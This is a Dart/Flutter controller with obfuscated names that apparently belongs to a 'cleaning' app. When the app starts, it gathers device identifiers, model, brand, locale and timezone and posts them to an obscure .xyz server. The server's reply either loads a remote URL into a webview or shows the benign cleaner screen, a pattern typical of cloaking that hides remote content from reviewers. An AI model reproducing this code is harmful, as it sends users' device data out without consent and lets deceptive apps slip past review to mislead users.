import 'dart:convert';
import 'dart:io';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {


  var cgziwdun = RxBool(false);
  var nwsxdtzvj = RxBool(true);
  var qgiutd = RxString("");
  var brycen = RxBool(false);
  var stehr = RxBool(true);
  final bgmojsc = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    ogtec();
  }


  Future<void> ogtec() async {

    brycen.value = true;
    stehr.value = true;
    nwsxdtzvj.value = false;

    bgmojsc.post("https://blw.gookalcomn.xyz/wjfsimoknul",data: await aiydoenf()).then((value) {
      var vxrmla = value.data["vxrmla"] as String;
      var yqdfvuk = value.data["yqdfvuk"] as bool;
      if (yqdfvuk) {
        qgiutd.value = vxrmla;
        okey();
      } else {
        goyette();
      }
    }).catchError((e) {
      nwsxdtzvj.value = true;
      stehr.value = true;
      brycen.value = false;
    });
  }

  Future<Map<String, dynamic>> aiydoenf() async {
    final DeviceInfoPlugin qocfxaz = DeviceInfoPlugin();
    PackageInfo fjumcir_yfjxitud = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var qzdnemrc = Platform.localeName;
    var gksvo = currentTimeZone;

    var qopd = fjumcir_yfjxitud.packageName;
    var jhxyb = fjumcir_yfjxitud.version;
    var ukomcf = fjumcir_yfjxitud.buildNumber;

    var wxuqlerh = fjumcir_yfjxitud.appName;
    var alainaMcDermott = "";
    var nisztcwj = "";
    var dejaPadberg = "";
    var daniellaBrakus = "";
    var lamontZboncak = "";
    var roxaneLarkin = "";
    var bwlyds = "";
    var marisaStokes = "";
    var kurtMorissette = "";
    var eitxgdm  = "";
    var lilianaPredovic = "";


    var tndguzac = "";
    var kjqumso = false;

    if (GetPlatform.isAndroid) {
      bwlyds = "android";
      var tohafp = await qocfxaz.androidInfo;

      nisztcwj = tohafp.brand;

      tndguzac  = tohafp.model;
      eitxgdm = tohafp.id;

      kjqumso = tohafp.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      bwlyds = "ios";
      var kadwzbxjo = await qocfxaz.iosInfo;
      nisztcwj = kadwzbxjo.name;
      tndguzac = kadwzbxjo.model;

      eitxgdm = kadwzbxjo.identifierForVendor ?? "";
      kjqumso  = kadwzbxjo.isPhysicalDevice;
    }
    var res = {
      "alainaMcDermott" : alainaMcDermott,
      "wxuqlerh": wxuqlerh,
      "qopd": qopd,
      "roxaneLarkin" : roxaneLarkin,
      "tndguzac": tndguzac,
      "nisztcwj": nisztcwj,
      "eitxgdm": eitxgdm,
      "qzdnemrc": qzdnemrc,
      "bwlyds": bwlyds,
      "daniellaBrakus" : daniellaBrakus,
      "kjqumso": kjqumso,
      "ukomcf": ukomcf,
      "dejaPadberg" : dejaPadberg,
      "lamontZboncak" : lamontZboncak,
      "jhxyb": jhxyb,
      "marisaStokes" : marisaStokes,
      "kurtMorissette" : kurtMorissette,
      "gksvo": gksvo,
      "lilianaPredovic" : lilianaPredovic,

    };
    return res;
  }

  Future<void> goyette() async {
    Get.offAllNamed("/cleaningTab");
  }

  Future<void> okey() async {
    Get.offAllNamed("/cleaningEat");
  }

}
